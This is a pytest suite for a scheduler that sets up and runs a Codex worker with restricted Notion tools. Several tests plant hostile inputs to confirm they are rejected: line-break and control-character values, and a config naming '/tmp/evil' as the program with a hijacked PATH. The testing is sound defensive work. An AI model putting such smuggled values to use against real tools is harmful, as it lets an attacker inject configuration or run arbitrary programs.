    assert (flag, key) == ("-c", "mcp_servers.notion.enabled_tools")
    enabled = tomllib.loads(f"tools = {toml}")["tools"]  # codex parses a -c value as TOML

    # library-notion.md's "Set the cover" starts with a file upload: without it no Entry gets a Cover.
    assert "notion-create-file-upload" in enabled
    assert {"notion-fetch", "notion-create-pages", "notion-update-page"} <= set(enabled)
    assert not [tool for tool in enabled if re.search(r"delete|move|share|duplicate|restore|comment", tool)]


def test_codex_again_keeps_the_pointer_and_trusts_the_folder_once(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    folder.mkdir(parents=True)
    (folder / "AGENTS.md").write_text("Graveyard Killer Library: x\nLì ci sono i post che ho salvato.\n"
                                      "Graveyard Killer's scripts are in /old/place. Run each one…\n")
    codex_folder(capsys, folder)
    out = codex_folder(capsys, folder)

    agents = (folder / "AGENTS.md").read_text()
    assert agents.startswith("Graveyard Killer Library: x\nLì ci sono i post che ho salvato.\n")
    assert agents.count("Graveyard Killer's scripts are in ") == 1 and "/old/place" not in agents
    assert str(folder / "AGENTS.md") not in out["written"]
    assert (codex_home / "config.toml").read_text().count(f"[projects.{json.dumps(str(folder))}]") == 1


@pytest.mark.parametrize("option, value", [("--folder", "run\nfolder"), ("--library", LIBRARY + "\x01")])
def test_codex_refuses_a_line_break_or_control_character(
    codex_home: Path, capsys: pytest.CaptureFixture[str], tmp_path: Path, option: str, value: str
) -> None:
    given = {"--folder": str(tmp_path / "run"), "--library": LIBRARY, option: value}
    code, out = cli(capsys, "codex", *(part for pair in given.items() for part in pair))
    assert code == 2 and "line break" in out["error"]
    assert not (tmp_path / "run").exists() and not (tmp_path / "run\nfolder").exists()


def test_codex_refuses_a_library_that_is_not_a_link(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", "my notion page")
    assert code == 2 and "not a web link" in out["error"]
    assert not folder.exists()


def test_codex_trusts_the_folder_by_its_real_path(
    codex_home: Path, capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    real = tmp_path / "real"
    real.mkdir()
    link = tmp_path / "link"
    link.symlink_to(real, target_is_directory=True)
    schedule.prepare_codex_folder(link, LIBRARY)
    config = (codex_home / "config.toml").read_text()
    assert f"[projects.{json.dumps(str(real.resolve()))}]" in config
    assert str(link) not in config


def test_codex_needs_codex_s_command(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(schedule, "find_codex", lambda: None)
    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", LIBRARY)
    assert code == 2 and "codex" in out["error"]
    assert not folder.exists()


def test_codex_refuses_opencode_s_run_folder(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    """Two routes in one folder would share its AGENTS.md and run the Worker twice a day."""
    folder.mkdir(parents=True)
    (folder / "schedule.json").write_text("{}")
    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", LIBRARY)
    assert code == 2 and "OpenCode's run folder" in out["error"] and "~/graveyard-killer-codex" in out["error"]
    assert not (folder / ".codex").exists() and not (folder / "AGENTS.md").exists()


def test_install_refuses_codex_s_run_folder(
    computer: Callable[[str], Calls], codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    calls = computer("Darwin")
    schedule.prepare_codex_folder(folder, LIBRARY)
    code, out = cli(capsys, "install", "--time", "9:05", "--model", MODEL, "--folder", str(folder), "--library", LIBRARY)
    assert code == 2 and "Codex's run folder" in out["error"]
    assert not (folder / "opencode.json").exists() and calls == []


def test_codex_moves_out_of_a_folder_it_shared_with_opencode(
    codex_home: Path, capsys: pytest.CaptureFixture[str], tmp_path: Path, folder: Path
) -> None:
    """0.11.0's Codex run folder was ~/graveyard-killer, OpenCode's too: --old-folder takes Codex's files out."""
    old = (tmp_path / "graveyard-killer").resolve()
    schedule.prepare_codex_folder(old, LIBRARY)
    for kept in ("schedule.json", "opencode.json", "worker.log"):
        (old / kept).write_text("OpenCode's\n")
    out = codex_folder(capsys, folder, "--old-folder", str(old))

    assert sorted(out["removed"]) == sorted([str(old / ".codex/graveyard-killer.json"), str(old / ".codex/config.toml"),
                                             str(old / ".codex/rules/graveyard-killer.rules"),
                                             f"{old / 'AGENTS.md'}: Codex's scripts line"])
    assert not (old / ".codex").exists() and not (old / "work").exists()
    assert (old / "AGENTS.md").read_text() == schedule.POINTER.format(library=LIBRARY)
    assert all((old / kept).read_text() == "OpenCode's\n" for kept in ("schedule.json", "opencode.json", "worker.log"))
    assert (folder / ".codex/graveyard-killer.json").is_file()
    assert f"codex-run --folder '{folder}'" in out["prompt"]


def test_codex_leaves_a_codex_config_it_did_not_write(
    codex_home: Path, capsys: pytest.CaptureFixture[str], tmp_path: Path, folder: Path
) -> None:
    old = tmp_path / "old"
    schedule.prepare_codex_folder(old, LIBRARY)
    (old / ".codex/config.toml").write_text('model = "my own"\n')
    out = codex_folder(capsys, folder, "--old-folder", str(old))
    assert str(old.resolve() / ".codex/config.toml") not in out["removed"]
    assert (old / ".codex/config.toml").read_text() == 'model = "my own"\n'
    assert not (old / ".codex/graveyard-killer.json").exists()


def test_codex_refuses_its_own_folder_as_the_old_one(
    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
) -> None:
    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", LIBRARY, "--old-folder", str(folder))
    assert code == 2 and "--old-folder" in out["error"]
    assert not folder.exists()


@pytest.fixture
def codex_run(
    codex_home: Path, folder: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]]:
    """codex-run in a prepared run folder, with a fake codex that plays the given responses."""
    log, scenario_file = tmp_path / "codex.jsonl", tmp_path / "scenario.json"
    monkeypatch.setenv("GK_FAKE_OPENCODE_LOG", str(log))
    monkeypatch.setenv("GK_FAKE_OPENCODE_SCENARIO", str(scenario_file))
    monkeypatch.setattr(schedule, "find_codex", lambda: [sys.executable, str(FAKE_OPENCODE)])
    schedule.prepare_codex_folder(folder, LIBRARY, alert="Riordino fallito.")
    capsys.readouterr()

    def go(responses: list[dict[str, Any]]) -> tuple[schedule.Outcome, list[dict[str, Any]], str]:
        scenario_file.write_text(json.dumps(responses))
        outcome = schedule.codex_run(folder)
        calls = [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []
        return outcome, calls, capsys.readouterr().out

    return go


def codex_events(*texts: str) -> list[dict[str, Any]]:
    return [{"type": "thread.started", "thread_id": "th_1"},
            {"type": "item.completed", "item": {"type": "command_execution", "command": "python3 post.py read 'x'",
                                                "exit_code": 0}},
            *({"type": "item.completed", "item": {"type": "agent_message", "text": text}} for text in texts),
            {"type": "turn.completed", "usage": {"input_tokens": 1, "output_tokens": 1}}]


def test_codex_run_runs_the_worker_in_the_folder_and_prints_the_ping(
    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
) -> None:
    ping = "Ho letto 3 nuovi post.\n\n- **1.** Vuoi la lista della spesa?"
    outcome, calls, printed = codex_run([{"events": codex_events("Leggo i post.", ping)}])

    assert outcome.ok and outcome.session == "th_1"
    assert printed == ping + "\n"
    [call] = calls
    assert call["argv"][:3] == ["exec", "--json", "--skip-git-repo-check"]
    assert call["argv"][-1] == schedule.PROMPT.format(library=LIBRARY)
    # The unattended run gets only the Notion tools a Worker needs: nothing that deletes or moves.
    [tools] = [value for value in call["argv"] if value.startswith("mcp_servers.notion.enabled_tools=")]
    enabled = json.loads(tools.split("=", 1)[1])
    assert "notion-update-page" in enabled and not [x for x in enabled if "delete" in x or "move" in x]
    assert Path(call["cwd"]).resolve() == folder and call["pwd"] == str(folder)
    log = (folder / "worker.log").read_text()
    assert "  tool     command python3 post.py read 'x'\n" in log
    last = json.loads((folder / "last-run.json").read_text())
    assert last["ok"] and last["ping"] == ping and last["agent"] == "codex"
    assert not (folder / ".worker-run.lock").exists()


def test_codex_run_says_why_a_run_failed(
    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path,
    monkeypatch: pytest.MonkeyPatch
) -> None:
    notified: list[str] = []
    real_run = subprocess.run

    def run(command: list[str], **options: Any) -> Any:
        if command[-1] == "notify":
            notified.append(options["input"])
            return subprocess.CompletedProcess(command, 0, '{"notified": true}', "")
        return real_run(command, **options)

    monkeypatch.setattr(subprocess, "run", run)
    outcome, _, printed = codex_run([{"events": [{"type": "thread.started", "thread_id": "th_2"},
                                                 {"type": "turn.failed", "error": {"message": "usage limit reached"}}],
                                      "exit": 1}])
    assert not outcome.ok
    assert printed.startswith("Riordino fallito. usage limit reached. Log: ")
    assert notified == ["Graveyard Killer\n" + printed]
    assert not json.loads((folder / "last-run.json").read_text())["ok"]


def test_codex_run_never_runs_twice_at_once(
    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
) -> None:
    (folder / ".worker-run.lock").write_text("123 2026-11-17T14:46:25\n")
    outcome, calls, printed = codex_run([{"events": codex_events("x")}])
    assert not outcome.ok and calls == []
    assert "already going" in printed
    assert (folder / ".worker-run.lock").exists()  # the other run's


def test_codex_run_takes_over_a_lock_left_by_a_crash(
    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
) -> None:
    lock = folder / ".worker-run.lock"
    lock.write_text("123 2026-11-16T14:46:25\n")
    old = time.time() - schedule.RUN_TIME_LIMIT - 3600
    os.utime(lock, (old, old))
    outcome, calls, _ = codex_run([{"events": codex_events("Fatto.")}])
    assert outcome.ok and len(calls) == 1 and not lock.exists()


def test_codex_run_cleans_the_work_folders_a_run_left(
    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
) -> None:
    left = folder / "work" / "graveyard-killer-7izjlt6s"
    (left / "frames").mkdir(parents=True)
    (left / ".graveyard-killer-work").write_text("")
    other = folder / "work" / "graveyard-killer-not-ours"
    other.mkdir()
    outcome, _, _ = codex_run([{"events": codex_events("Fatto.")}])
    assert outcome.ok
    assert not left.exists()
    assert other.exists()  # no marker: not post.py's, so it stays
    assert "graveyard-killer-7izjlt6s, left by the run" in (folder / "worker.log").read_text()


def test_codex_run_starts_no_program_named_in_the_run_folder(
    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
) -> None:
    """A scheduled task may write the run folder: what codex-run starts never comes from there."""
    (folder / "codex.json").write_text(json.dumps({"library": LIBRARY, "codex": ["/tmp/evil"], "path": "/tmp"}))
    outcome, calls, _ = codex_run([{"events": codex_events("Fatto.")}])
    assert outcome.ok and len(calls) == 1
    assert "/tmp" not in (calls[0]["path"] or "").split(os.pathsep)[:1]
